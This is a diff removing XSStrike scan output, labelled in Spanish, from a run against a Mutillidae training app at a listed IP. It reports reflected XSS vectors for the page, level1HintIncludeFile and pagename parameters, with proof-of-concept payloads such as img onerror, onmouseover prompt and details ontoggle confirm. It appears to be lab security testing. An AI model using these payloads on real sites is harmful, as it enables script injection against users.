@@ -1,60 +1,0 @@
-🔗 URL: http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php
-🧩 Parámetro afectado: page
-🎯 Payload: 1464 						<td ReflectedXSSExecutionPoint="1">User visited: "><img src=x onerror="[91msetTimeout[0m('alert(1)',1)" class=dalfox></td>
-🧾 Evidencia:
-[91m
-	XSStrike [97mv3.1.5
-[0m
-[97m[~][0m Crawling the target [0m
-[97m[~][0m Parsing mutillidae/index.php?page=show-log.php   [0m[!!] Unable to connect to the target. [0m
-[92m[+][0m Potentially vulnerable objects found at http://128.198.49.198:8102/mutillidae/index.php [0m
-[91m------------------------------------------------------------[0m
-1464 						<td ReflectedXSSExecutionPoint="1">User visited: "><img src=x onerror="[91msetTimeout[0m('alert(1)',1)" class=dalfox></td>[91m------------------------------------------------------------[0m
-[97m[~][0m Parsing php?page=secret-administrative-pages.php [0m[97m[~][0m Parsing index.php?page=framer.html               [0m[97m[~][0m Parsing hp?page=documentation/setting-up-ssl.php [0m[97m[~][0m Parsing ./webservices/soap/ws-user-account.php   [0m[97m[~][0m Parsing index.php?page=user-poll.php             [0m[97m[~][0m Parsing index.php?page=add-to-your-blog.php      [0m[97m[~][0m Parsing index.php?page=directory-browsing.php    [0m[97m[~][0m Parsing index.php?page=user-info-xpath.php       [0m[97m[~][0m Parsing .php&iv=6bc24fc1ab650b25b4114e93a98f1eba [0m[97m[~][0m Parsing ndex.php?page=back-button-discussion.php [0m[97m[~][0m Parsing index.php?page=user-info.php             [0m[97m[~][0m Parsing index.php?page=login.php                 [0m[97m[~][0m Parsing index.php?page=view-someones-blog.php    [0m[97m[~][0m Parsing ./webservices/soap/ws-hello-world.php    [0m[97m[~][0m Parsing index.php?page=captured-data.php         [0m[97m[~][0m Parsing framer.html                              [0m[97m[~][0m Parsing text-generator.php?pagename=show-log.php [0m[97m[~][0m Parsing index.php?page=phpinfo.php               [0m[97m[~][0m Parsing ?page=source-viewer.php                  [0m[97m[~][0m Parsing index.php?page=client-side-comments.php  [0m[97m[~][0m Parsing ?page=credits.php                        [0m[97m[~][0m Parsing page=home.php&popUpNotificationCode=HPH0 [0m[97m[~][0m Parsing index.php?page=robots-txt.php            [0m[97m[~][0m Parsing ?page=text-file-viewer.php               [0m[97m[~][0m Parsing set-up-database.php                      [0m[97m[~][0m Parsing index.php?page=phpmyadmin.php            [0m[97m[~][0m Parsing index.php?page=installation.php          [0m[97m[~][0m Parsing index.php                                [0m[97m[~][0m Parsing age-wrapper.php?level1HintIncludeFile=55 [0m[97m[~][0m Parsing p?page=documentation/vulnerabilities.php [0m[97m[~][0m Parsing ?page=show-log.php                       [0m[97m[~][0m Parsing index.php?page=framing.php               [0m[97m[~][0m Parsing php?do=toggle-security&page=show-log.php [0m[97m[~][0m Parsing index.php?page=privilege-escalation.php  [0m[97m[~][0m Parsing x.php?page=pen-test-tool-lookup-ajax.php [0m[97m[~][0m Parsing index.php?page=pen-test-tool-lookup.php  [0m[97m[~][0m Parsing ?do=toggle-enforce-ssl&page=show-log.php [0m[97m[~][0m Parsing index.php?page=ssl-misconfiguration.php  [0m[97m[~][0m Parsing assword-generator.php&username=anonymous [0m[97m[~][0m Parsing ./webservices/rest/ws-user-account.php   [0m[97m[~][0m Parsing index.php?page=html5-storage.php         [0m[97m[~][0m Parsing ex.php?page=arbitrary-file-inclusion.php [0m[97m[~][0m Parsing ebservices/soap/ws-lookup-dns-record.php [0m[97m[~][0m Parsing index.php?page=cache-control.php         [0m[97m[~][0m Parsing index.php?page=source-viewer.php         [0m[97m[~][0m Parsing index.php?page=repeater.php              [0m[97m[~][0m Parsing index.php?page=credits.php               [0m[97m[~][0m Parsing -Mutillidae-over-Virtual-Box-network.php [0m[97m[~][0m Parsing p%3Fpage-title%3DStyling+with+Mutillidae [0m[97m[~][0m Parsing javascript&colon;alert(1)                [0m[97m[~][0m Parsing index.php?page=xml-validator.php         [0m[97m[~][0m Parsing age=documentation/usage-instructions.php [0m[97m[~][0m Parsing                                          [0m[97m[~][0m Parsing index.php?page=upload-file.php           [0m[97m[~][0m Parsing x.php?page=documentation/change-log.html [0m[97m[~][0m Parsing index.php?page=sqlmap-targets.php        [0m[!!] Unable to connect to the target. [0m
-[97m[~][0m Parsing index.php?page=capture-data.php          [0m[!!] Unable to connect to the target. [0m
-[97m[~][0m Parsing index.php?page=show-log.php              [0m[!!] Unable to connect to the target. [0m
-[97m[~][0m Parsing index.php?page=register.php              [0m[!!] Unable to connect to the target. [0m
-[97m[~][0m Parsing index.php?page=text-file-viewer.php      [0m[97m[~][0m Parsing .php?page=site-footer-xss-discussion.php [0m[97m[~][0m Parsing p?page=client-side-control-challenge.php [0m[97m[~][0m Parsing index.php?page=dns-lookup.php            [0m[97m[~][0m Parsing do=toggle-bubble-hints&page=show-log.php [0m[97m[~][0m Parsing index.php?page=set-background-color.php  [0m[!!] Unable to connect to the target. [0m
-[97m[~][0m Parsing index.php?page=browser-info.php          [0m[97m[~][0m Parsing ex.php?page=user-agent-impersonation.php [0m[97m[~][0m Parsing -Mutillidae-over-Virtual-Box-network.php [0m[97m[~][0m Parsing ?page=add-to-your-blog.php               [0m[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[93m[!][0m Progress: 10/131 [0m[93m[!][0m Progress: 20/131 [0m[93m[!][0m Progress: 30/131 [0m[93m[!][0m Progress: 40/131 [0m[93m[!][0m Progress: 50/131 [0m[93m[!][0m Progress: 60/131 [0m[93m[!][0m Progress: 70/131 [0m[93m[!][0m Progress: 80/131 [0m[93m[!][0m Progress: 90/131 [0m[93m[!][0m Progress: 100/131 [0m[93m[!][0m Progress: 110/131 [0m[93m[!][0m Progress: 120/131 [0m[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[!!] Unable to connect to the target. [0m
-[93m[!][0m Progress: 130/131 [0m[92m[++][91m Vulnerable webpage: [92mhttp://128.198.49.198:8102/mutillidae/index.php[0m [0m
-[92m[++][91m Vector for [92mpage[0m: <HTmL/+/ONmouSeOver%09=%09a=prompt,a()%0dx> [0m
-[93m[!][0m Progress: 131/131 [0m
---------------------------------------------------
-
-🔗 URL: http://128.198.49.198:8102/mutillidae/hints-page-wrapper.php?level1HintIncludeFile=11
-🧩 Parámetro afectado: level1HintIncludeFile
-🎯 Payload: No identificado explícitamente
-🧾 Evidencia:
-[91m
-	XSStrike [97mv3.1.5
-[0m
-[97m[~][0m Crawling the target [0m
-[97m[~][0m Parsing age-wrapper.php?level1HintIncludeFile=11 [0m[92m[++][91m Vulnerable webpage: [92mhttp://128.198.49.198:8102/mutillidae/hints-page-wrapper.php[0m [0m
-[92m[++][91m Vector for [92mlevel1HintIncludeFile[0m: <DetaILs%0dontOgGle%09=%09(confirm)()%0dx> [0m
-[93m[!][0m Progress: 2/2 [0m
---------------------------------------------------
-
-🔗 URL: http://128.198.49.198:8102/mutillidae/includes/pop-up-help-context-generator.php?pagename=php-errors.php
-🧩 Parámetro afectado: pagename
-🎯 Payload: No identificado explícitamente
-🧾 Evidencia:
-[91m
-	XSStrike [97mv3.1.5
-[0m
-[97m[~][0m Crawling the target [0m
-[97m[~][0m Parsing xt-generator.php?pagename=php-errors.php [0m[92m[++][91m Vulnerable webpage: [92mhttp://128.198.49.198:8102/mutillidae/includes/pop-up-help-context-generator.php[0m [0m
-[92m[++][91m Vector for [92mpagename[0m: <DETAIlS%09ONtoGgle+=+confirm()%0dx> [0m
-[93m[!][0m Progress: 2/2 [0m
---------------------------------------------------
-
